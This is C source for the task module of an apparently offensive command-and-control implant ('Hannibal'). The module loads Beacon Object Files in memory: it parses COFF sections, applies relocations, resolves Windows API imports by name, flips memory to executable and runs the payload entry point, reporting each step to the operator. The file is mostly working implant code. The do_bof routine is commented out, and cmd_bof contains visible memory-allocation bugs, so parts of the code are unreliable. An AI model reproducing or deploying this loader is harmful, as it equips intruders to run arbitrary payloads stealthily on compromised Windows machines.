#include "BeaconApi.h"
#include "config.h"

#ifdef INCLUDE_CMD_EXECUTE_BOF

#include "hannibal_tasking.h"




#define SIZE_OF_PAGE     0x1000
#define PAGE_ALIGN( x ) (((ULONG_PTR)x) + ((SIZE_OF_PAGE - (((ULONG_PTR)x) & (SIZE_OF_PAGE - 1))) % SIZE_OF_PAGE))

typedef struct _SECTION_MAP {
	PVOID Base;
	ULONG Size;
} SECTION_MAP, *PSECTION_MAP; 

typedef struct _OBJECT_CTX {
	union {
		ULONG_PTR Base;
		PIMAGE_FILE_HEADER Header;
	};

	PIMAGE_SYMBOL SymTbl;
	PVOID* SymMap;
	PSECTION_MAP SecMap;
	PIMAGE_SECTION_HEADER Sections;
} OBJECT_CTX, *POBJECT_CTX;

BOOL ReadFileFromDiskA(PINSTANCE hannibal_instance_ptr, char *task_uuid, LPCSTR cFileName, PBYTE* ppFileBuffer, PDWORD pdwFileSize) {

	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwFileSize = NULL,
		dwNumberOfBytesRead = NULL;
	PBYTE pBaseAddress = NULL;
		WCHAR DbgString[256] = { 0 };
	if (!cFileName || !pdwFileSize || !ppFileBuffer)
		goto _END_OF_FUNC;

	if ((hFile = hannibal_instance_ptr->Win32.CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		// printf("[!] CreateFileA Failed With Error: %ld \n", GetLastError());
			pic_wsprintf(DbgString, L"[!] CreateFileA Failed With Error: %ld \n", hannibal_instance_ptr->Win32.GetLastError());
			hannibal_response(DbgString, task_uuid);
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = hannibal_instance_ptr->Win32.GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		// printf("[!] GetFileSize Failed With Error: %ld \n", GetLastError());
			pic_wsprintf(DbgString, L"[!] GetFileSize Failed With Error: %ld \n", hannibal_instance_ptr->Win32.GetLastError());
			hannibal_response(DbgString, task_uuid);
		goto _END_OF_FUNC;
	}

	if (!(pBaseAddress = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize))) {
		// printf("[!] HeapAlloc Failed With Error: %ld \n", GetLastError());
			pic_wsprintf(DbgString, L"[!] HeapAlloc Failed With Error: %ld \n", hannibal_instance_ptr->Win32.GetLastError());
			hannibal_response(DbgString, task_uuid);
		goto _END_OF_FUNC;
	}

	if (!hannibal_instance_ptr->Win32.ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		// printf("[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
			pic_wsprintf(DbgString, L"[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", hannibal_instance_ptr->Win32.GetLastError(), dwNumberOfBytesRead, dwFileSize);
			hannibal_response(DbgString, task_uuid);
		goto _END_OF_FUNC;
	}

	*ppFileBuffer = pBaseAddress;
	*pdwFileSize = dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		hannibal_instance_ptr->Win32.CloseHandle(hFile);

	if (pBaseAddress && !*ppFileBuffer)
		hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->Win32.GetProcessHeap(), 0x00, pBaseAddress);

	return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}


PVOID ObjectResolveSymbol(PINSTANCE hannibal_instance_ptr, char *task_uuid, PSTR Symbol) {
	PSTR Function = { 0 };
	PSTR Library = { 0 };
	PCHAR Position = { 0 };
	CHAR Buffer[ MAX_PATH ] = { 0 };
	PVOID Resolved = { 0 };
	PVOID Module = { 0 };
	WCHAR DbgString[256] = { 0 };
	if (!Symbol) {
		return NULL;
	}

		//
	// remove the __imp_ 
	//
	Symbol += 6;

	//
	// check if it is an imported Beacon api 
	//
	if (pic_strncmp("Beacon", Symbol, 6) == 0) {
		if (pic_strcmp("BeaconDataParse", Symbol) == 0) {
			Resolved = BeaconDataParse;
		} else if (pic_strcmp("BeaconDataInt", Symbol) == 0) {
			Resolved = BeaconDataInt;
		} else if (pic_strcmp("BeaconDataShort", Symbol) == 0) {
			Resolved = BeaconDataShort;
		} else if (pic_strcmp("BeaconDataLength", Symbol) == 0) {
			Resolved = BeaconDataLength;
		} else if (pic_strcmp("BeaconDataExtract", Symbol) == 0) {
			Resolved = BeaconDataExtract;
		} else if (pic_strcmp("BeaconOutput", Symbol) == 0) {
			Resolved = BeaconOutput;
		} else if (pic_strcmp("BeaconPrintf", Symbol) == 0) {
			Resolved = BeaconPrintf;
		}
	} else {
		//
		// resolve an imported/external function using
		// the following syntax "LIBRARY$Function"
		//

		//
		// copy the symbol into the buffer 
		//
		pic_memset(Buffer, 0, MAX_PATH);
		pic_memcpy(Buffer, Symbol, pic_strlen(Symbol));

		//
		// replace the $ with a null byte 
		//
		Position = pic_strchr(Buffer, '$');
		*Position = 0;

		Library = Buffer;
		Function = Position + 1;

		//
		// resolve the library instance
		// from the symbol string
		//
		if (!(Module = hannibal_instance_ptr->Win32.GetModuleHandleA(Library))) {
			if (!(Module = hannibal_instance_ptr->Win32.LoadLibraryA(Library))) {
				// printf("[!] Module not found: %s\n", Library);
					pic_wsprintf(DbgString, L"[!] Module not found: %s\n", Library);
					hannibal_response(DbgString, task_uuid);
			return NULL;
			}
		}

		//
		// resolve function from the loaded library 
		//
		if (!(Resolved = hannibal_instance_ptr->Win32.GetProcAddress(Module, Function))) {
			// printf("[!] Function not found inside of %s: %s\n", Library, Function);
			pic_wsprintf(DbgString, L"[!] Function not found inside of %s: %s\n", Library, Function);
			hannibal_response(DbgString, task_uuid);
			return NULL;
		}
	}

	// printf(" -> %s @ %p\n", Symbol, Resolved);
	pic_wsprintf(DbgString, L" -> %s @ %p\n", Symbol, Resolved);
	hannibal_response(DbgString, task_uuid);

	hannibal_instance_ptr->Win32.RtlSecureZeroMemory(Buffer, sizeof(Buffer));

	return Resolved; 
}

/**
	* @brief
	* calculate the size of virtual memory we need to
	* allocate for the sections and executable code 
	*
	* @param ObjCtx
	* the context of the object file which contains the
	* base address/header, symbol table, and sections.
	*
	* @return
	* required virtual size to allocate
	*/
ULONG ObjectVirtualSize(PINSTANCE hannibal_instance_ptr, char *task_uuid, POBJECT_CTX ObjCtx) {

	PIMAGE_RELOCATION ObjRel = { 0 };
	PIMAGE_SYMBOL ObjSym = { 0 };
	PSTR Symbol = { 0 };
	ULONG Length = { 0 };

	//
	// calculate the size of sections + align the memory up 
	//
	for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
		Length += PAGE_ALIGN(ObjCtx->Sections[i].SizeOfRawData);
	}

	//
	// calculate the function map size 
	//
	for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
		ObjRel = (PIMAGE_RELOCATION)(ObjCtx->Base + ObjCtx->Sections[i].PointerToRelocations);

		//
		// iterate over section relocation and retrieve the each symbol
		// to check if it is an import (starting with an __imp_)
		//
		for (int j = 0; j < ObjCtx->Sections[i].NumberOfRelocations; j++) {
			ObjSym = &ObjCtx->SymTbl[ObjRel->SymbolTableIndex];

			//
			// get the symbol name 
			//
			if (ObjSym->N.Name.Short) {
				//
				// short name (8 bytes)
				//
				Symbol = (PSTR)ObjSym->N.ShortName;
			}
			else {
				//
				// long name (over 8 bytes) so we get to get
				// the symbol string via its offset 
				//
				Symbol = (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + (ULONG_PTR)ObjSym->N.Name.Long);
			}

			//
			// check if the symbol starts with an __imp_
			//
			if (pic_strncmp("__imp_", Symbol, 6) == 0) {
				Length += sizeof(PVOID);
			}

			//
			// handle next relocation item/symbol
			//
			ObjRel = (PVOID)((ULONG_PTR)ObjRel + sizeof(IMAGE_RELOCATION));
		}
	}

	return PAGE_ALIGN(Length);
}



VOID ObjectRelocation(PINSTANCE hannibal_instance_ptr, char *task_uuid, ULONG Type,  PVOID Reloc,  PVOID SecBase) {

	ULONG32 Offset32 = { 0 };
	ULONG64 Offset64 = { 0 };

	switch (Type)
	{
	case IMAGE_REL_AMD64_REL32:
		*(PUINT32) Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32));
		break;

	case IMAGE_REL_AMD64_REL32_1:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 1);
		break;

	case IMAGE_REL_AMD64_REL32_2:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 2);
		break;

	case IMAGE_REL_AMD64_REL32_3:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 3);
		break;

	case IMAGE_REL_AMD64_REL32_4:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 4);
		break;

	case IMAGE_REL_AMD64_REL32_5:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 5);
		break;

	case IMAGE_REL_AMD64_ADDR64:
		*(PUINT64)Reloc = (*(PUINT64)(Reloc)) + (ULONG64)SecBase; 
		break;
	}
}

BOOL ObjectProcessSection(PINSTANCE hannibal_instance_ptr, char *task_uuid, POBJECT_CTX ObjCtx) {
	PVOID SecBase = { 0 };
	ULONG SecSize = { 0 };
	PIMAGE_RELOCATION ObjRel = { 0 };
	PIMAGE_SYMBOL ObjSym = { 0 };
	PSTR Symbol = { 0 };
	PVOID Resolved = { 0 };
	PVOID Reloc = { 0 };
	ULONG FnIndex = { 0 };
   	WCHAR DbgString[256] = { 0 };
	//
	// process & relocate the object file sections
	// and process symbols and imported functions
	//
	for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
		ObjRel = (PIMAGE_RELOCATION)(ObjCtx->Base + ObjCtx->Sections[i].PointerToRelocations);

		//
		// iterate over section relocation and retrieve the each symbol
		// to check if it is an import (starting with an __imp_)
		//
		for (int j = 0; j < ObjCtx->Sections[i].NumberOfRelocations; j++) {
			ObjSym = &ObjCtx->SymTbl[ObjRel->SymbolTableIndex];

			//
			// get the symbol name 
			//
			if (ObjSym->N.Name.Short) {
				//
				// short name (8 bytes)
				//
				Symbol = (PSTR)ObjSym->N.ShortName;
			}
			else {
				//
				// long name (over 8 bytes) so we get to get
				// the symbol string via its offset 
				//
				Symbol = (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + (ULONG_PTR)ObjSym->N.Name.Long);
			}

			Reloc = (PVOID)((ULONG_PTR)ObjCtx->SecMap[i].Base + ObjRel->VirtualAddress);
			Resolved = NULL;

			//
			// check if the symbol starts with an __imp_
			//
			if (pic_strncmp("__imp_", Symbol, 6) == 0) {
				//
				// if the symbol starts with __imp_ then
				// resolve the imported function 
				//
				if (!(Resolved = ObjectResolveSymbol(hannibal_instance_ptr, task_uuid, Symbol))) {
					// printf("[!] ObjectResolveSymbol failed to resolve symbol: %s\n", Symbol);
					pic_wsprintf(DbgString, L"[!] ObjectResolveSymbol failed to resolve symbol: %s\n", Symbol);
					hannibal_response(DbgString, task_uuid);
					return FALSE;
				}
			}

			//
			// perform relocation on the imported function 
			//
			if (ObjRel->Type == IMAGE_REL_AMD64_REL32 && Resolved) {
				ObjCtx->SymMap[FnIndex] = Resolved;

				*((PUINT32)Reloc) = (UINT32)(((ULONG_PTR)ObjCtx->SymMap + FnIndex * sizeof(PVOID)) - (ULONG_PTR)Reloc - sizeof(UINT32));

				FnIndex++;
			}
			else {
				SecBase = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Base;

				//
				// perform relocation on the section 
				//
				ObjectRelocation(hannibal_instance_ptr, task_uuid, ObjRel->Type, Reloc, SecBase);
			}

			//
			// handle next relocation item/symbol
			//
			ObjRel = (PVOID)((ULONG_PTR)ObjRel + sizeof(IMAGE_RELOCATION));
		}
	}

	return TRUE;
}

BOOL ObjectExecute(PINSTANCE hannibal_instance_ptr, char *task_uuid, POBJECT_CTX ObjCtx, PSTR Entry, PBYTE Args, ULONG Argc) {

	VOID(*Main)(PBYTE, ULONG) = NULL;
	PIMAGE_SYMBOL ObjSym = { 0 };
	PSTR Symbol = { 0 };
	PVOID SecBase = { 0 };
	ULONG SecSize = { 0 };
	ULONG Protect = { 0 };
   	WCHAR DbgString[256] = { 0 };

	for (int i = 0; i < ObjCtx->Header->NumberOfSymbols; i++) {
		ObjSym = &ObjCtx->SymTbl[i];

		//
		// get the symbol name 
		//
		if (ObjSym->N.Name.Short) {
			//
			// short name (8 bytes)
			//
			Symbol = (PSTR)ObjSym->N.ShortName;
		}
		else {
			//
			// long name (over 8 bytes) so we get to get
			// the symbol string via its offset 
			//
			Symbol = (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + (ULONG_PTR)ObjSym->N.Name.Long);
		}

		//
		// check if it is a function defined
		// inside of the object file 
		//
			if (ISFCN(ObjCtx->SymTbl[i].Type) && pic_strcmp(Symbol, Entry) == 0) {
			//
			// get the section and change it to be executable
			// 
			SecBase = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Base;
			SecSize = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Size;

			//
			// make the section executable
			//
			if (!hannibal_instance_ptr->Win32.VirtualProtect(SecBase, SecSize, PAGE_EXECUTE_READ, &Protect)) {
				// printf("[!] VirtualProtect Failed with Error: %ld\n", GetLastError());
                    pic_wsprintf(DbgString, L"[!] VirtualProtect Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
                    hannibal_response(DbgString, task_uuid);
				break;
			}

			//
			// execute the bof entry point 
			//
			Main = (PVOID)((ULONG_PTR)(SecBase) + ObjSym->Value);
			Main(Args, Argc);

			//
			// revert the old section protection 
			//
			if (!hannibal_instance_ptr->Win32.VirtualProtect(SecBase, SecSize, Protect, &Protect)) {
				// printf("[!] VirtualProtect Failed with Error: %ld\n", GetLastError());
                    pic_wsprintf(DbgString, L"[!] VirtualProtect Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
                    hannibal_response(DbgString, task_uuid);
				break;
			}

			return TRUE; 
				}
	}

	return FALSE;
}

BOOL ObjectLdr(PINSTANCE hannibal_instance_ptr, char *task_uuid, PVOID pObject, PSTR sFunction, PBYTE pArgs, ULONG uArgc) {

	OBJECT_CTX ObjCtx = { 0 };
	ULONG VirtSize = { 0 };
	PVOID VirtAddr = { 0 };
	PVOID SecBase = { 0 };
	ULONG SecSize = { 0 };
	BOOL Success = FALSE;
    WCHAR DbgString[256] = { 0 };
	//
	// sanity check arguments 
	//
	if (!pObject || !sFunction) {
		return FALSE;
	}

	//
	// parse the header file, symbol table
	// and sections from the object file 
	//
	ObjCtx.Header = (PIMAGE_FILE_HEADER)pObject;
	ObjCtx.SymTbl = (PIMAGE_SYMBOL)((ULONG_PTR)pObject + (ULONG_PTR)ObjCtx.Header->PointerToSymbolTable);
	ObjCtx.Sections = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pObject + sizeof(IMAGE_FILE_HEADER));

#ifdef _M_X64
	//
	// validate that the object file matches
	// the architecture of the current process 
	//
	if (ObjCtx.Header->Machine != IMAGE_FILE_MACHINE_AMD64) {
		// printf("[*] object file is not x64");
            pic_wsprintf(DbgString, L"[*] object file is not x64");
            hannibal_response(DbgString, task_uuid);
		return FALSE;
	}
#else
	// puts("[!] Do not support x86");
    hannibal_response(L"[!] Do not support x86", task_uuid);
	return FALSE;
#endif

	//
	// calculate the required virtual
	// memory size to allocate
	//
	VirtSize = ObjectVirtualSize(hannibal_instance_ptr, task_uuid, &ObjCtx);
	// printf("[*] Virtual Size [%d bytes]\n", VirtSize);
        pic_wsprintf(DbgString, L"[*] Virtual Size [%d bytes]\n", VirtSize);
        hannibal_response(DbgString, task_uuid);

	//
	// allocate virtual memory 
	//
	if (!(VirtAddr = hannibal_instance_ptr->Win32.VirtualAlloc(NULL, VirtSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
		// printf("[!] VirtualAlloc Failed with Error: %ld\n", GetLastError());
            pic_wsprintf(DbgString, L"[!] VirtualAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
            hannibal_response(DbgString, task_uuid);
		goto _END_OF_CODE;
	}

	//
	// allocate heap memory to store
	// the section map array 
	//
	if (!(ObjCtx.SecMap = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, ObjCtx.Header->NumberOfSections * sizeof(SECTION_MAP)))) {
		// printf("[!] HeapAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
            pic_wsprintf(DbgString, L"[!] HeapAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
            hannibal_response(DbgString, task_uuid);
		return FALSE;
	}

	// printf("[*] Allocated object file @ %p [%ld bytes]\n", VirtAddr, VirtSize);
        pic_wsprintf(DbgString, L"[*] Allocated object file @ %p [%ld bytes]\n", VirtAddr, VirtSize);
        hannibal_response(DbgString, task_uuid);

	//
	// set the section base to
	// the allocate memory 
	//
	SecBase = VirtAddr;

	//
	// copy over the sections 
	//
	for (int i = 0; i < ObjCtx.Header->NumberOfSections; i++) {
		ObjCtx.SecMap[i].Size = SecSize = ObjCtx.Sections[i].SizeOfRawData;
		ObjCtx.SecMap[i].Base = SecBase;

		//
		// copy over the section data to
		// the newly allocated memory region
		//
		pic_memcpy(SecBase, (PVOID)(ObjCtx.Base + (ULONG_PTR)ObjCtx.Sections[i].PointerToRawData), SecSize);
		// printf(" -> %-8s @ %p [%ld bytes]\n", (PSTR)ObjCtx.Sections[i].Name, SecBase, SecSize);
		pic_wsprintf(DbgString, L" -> %-8s @ %p [%ld bytes]\n", (PSTR)ObjCtx.Sections[i].Name, SecBase, SecSize);
		hannibal_response(DbgString, task_uuid);

		//
		// get the next page entry to write our
		// object data section into
		//
		SecBase = (PVOID)PAGE_ALIGN(((ULONG_PTR)SecBase + SecSize));
	}

	//
	// last page of the object memory is the symbol/function map
	//
	ObjCtx.SymMap = SecBase;

	// puts("\n=== Process Sections ===\n");
    hannibal_response(L"=== Process Sections ===", task_uuid);
	if (!(Success = ObjectProcessSection(hannibal_instance_ptr, task_uuid, &ObjCtx))) {
		// printf("[!] Failed to process sections\n");
		hannibal_response(L"[!] Failed to process sections", task_uuid);
		goto _END_OF_CODE;
	}

	// puts("\n=== Symbol Execution ===\n");
    hannibal_response(L"=== Symbol Execution ===", task_uuid);
	if (!(Success = ObjectExecute(hannibal_instance_ptr, task_uuid, &ObjCtx, sFunction, pArgs, uArgc))) {
		// printf("[!] Failed to execute function: %s\n", sFunction);
		pic_wsprintf(DbgString, L"[!] Failed to execute function: %s\n", sFunction);
		hannibal_response(DbgString, task_uuid);
		goto _END_OF_CODE;
	}

	// printf("[*] Object file successfully executed\n");
	hannibal_response(L"[*] Object file successfully executed", task_uuid);

_END_OF_CODE:
	if (VirtAddr) {
		hannibal_instance_ptr->Win32.VirtualFree(VirtAddr, 0, MEM_RELEASE);
		VirtAddr = NULL;
	}

	if (ObjCtx.SecMap) {
		hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, ObjCtx.SecMap);
		ObjCtx.SecMap = NULL;
	}

	//
	// clear the struct context from the stack
	//
	hannibal_instance_ptr->Win32.RtlSecureZeroMemory(&ObjCtx, sizeof(ObjCtx));

	return Success;
}

int do_bof(BOF_IN* bof_payload)
{
	// // Now bof doesn't work like this. change.
	// PSTR sPath = { 0 };
	// PBYTE pObject = { 0 };
	// ULONG uLength = { 0 };

	// sPath = bof_payload.args;
	// WCHAR DbgString[256];
	
	// // pic_strcpy(DbgString, "[*] Loading object file:");
	// // pic_strcat(DbgString, sPath);
	// // printf("[*] Loading object file: %s\n", sPath);
	
	// pic_wsprintf(DbgString, L"[*] Loading object file: %s", sPath);
	// hannibal_response(DbgString, task_uuid);
	
	// //
	// // read object file from disk into memory 
	// //

	// if (!ReadFileFromDiskA(hannibal_instance_ptr, task_uuid, sPath, (PBYTE*)&pObject, &uLength)) {
	// 	// printf("[!] Failed to load file: %s\n", sPath);
	// 	hannibal_response(L"[!] Failed to load file", task_uuid);
	// 	goto END;
	// }
	// // printf("[*] Object file loaded @ %p [%ld bytes]\n", pObject, uLength);
	// 	pic_wsprintf(DbgString, L"[*] Object file loaded @ %p [%ld bytes]", pObject, uLength);
	// 	hannibal_response(DbgString, task_uuid);
	// //
	// // invoke the object file
	// //

	// // TODOs: The `NULL` parameter is actually arguments. We need to pass the arguments to the object file correctly.
	// if (!ObjectLdr(hannibal_instance_ptr, task_uuid, pObject, "go", NULL, 0)) {
	// 	// printf("[!] Failed to execute object file\n");
	// 	hannibal_response(L"[!] Failed to execute object file", task_uuid);
	// }
END:
	return 0;
}

SECTION_CODE void cmd_bof(TASK t)
{
	HANNIBAL_INSTANCE_PTR

	CMD_EXECUTE_BOF *exec_bof = (CMD_EXECUTE_BOF *)t.cmd;

	BOF_IN *bof_in_payload = (BOF_IN *)hannibal_instance_ptr->Win32.VirtualAlloc(
		NULL,
		sizeof(BOF_IN *),
		MEM_COMMIT,
		PAGE_READWRITE
	);
	
	// bof payload size
	size_t buffer_size = exec_bof->bof_size;
	
	// allocate memory for the bof content
	UINT8 *bof_buff = *(UINT8 **)hannibal_instance_ptr->Win32.VirtualAlloc(
		NULL,
		buffer_size,
		MEM_COMMIT,
		PAGE_READWRITE
	);

	if (bof_buff != NULL) {
		pic_memcpy(bof_buff, exec_bof->bof, buffer_size);
	}

	bof_in_payload->args = exec_bof->args;
	bof_in_payload->arg_size = exec_bof->arg_size;
	bof_in_payload->hannibal_instance = hannibal_instance_ptr;
	bof_in_payload->controller_uuid = t.task_uuid;
	bof_in_payload->pbof_content = bof_buff;
	
	// protect execute read 

	DWORD OldProtection = 0;
	hannibal_instance_ptr->Win32.VirtualProtect(bof_buff, buffer_size, PAGE_EXECUTE_READ, &OldProtection);
	
	// real function
	do_bof(bof_in_payload);

	 // If you don't put a task response in the response queue, the uuid won't
    // get freed and that is a leak. Either do it in there or here.

    // TASK response_t;

    // response_t.output = (LPCSTR)response_content;
    // response_t.output_size = CURRENT_BUFFER_USAGE;
    // response_t.task_uuid = t.task_uuid;

    // task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);

	hannibal_instance_ptr->Win32.VirtualFree(bof_in_payload, 0, MEM_RELEASE);
	hannibal_instance_ptr->Win32.VirtualFree(bof_buff, 0, MEM_RELEASE);
	hannibal_instance_ptr->Win32.VirtualFree(exec_bof->args, 0, MEM_RELEASE);
	hannibal_instance_ptr->Win32.VirtualFree(exec_bof->bof, 0, MEM_RELEASE);
	hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
	// hannibal_instance_ptr->Win32.VirtualFree(t.task_uuid, 0, MEM_RELEASE); // Make sure your hbin sends a response so this gets freed in post_tasks
}

#endif
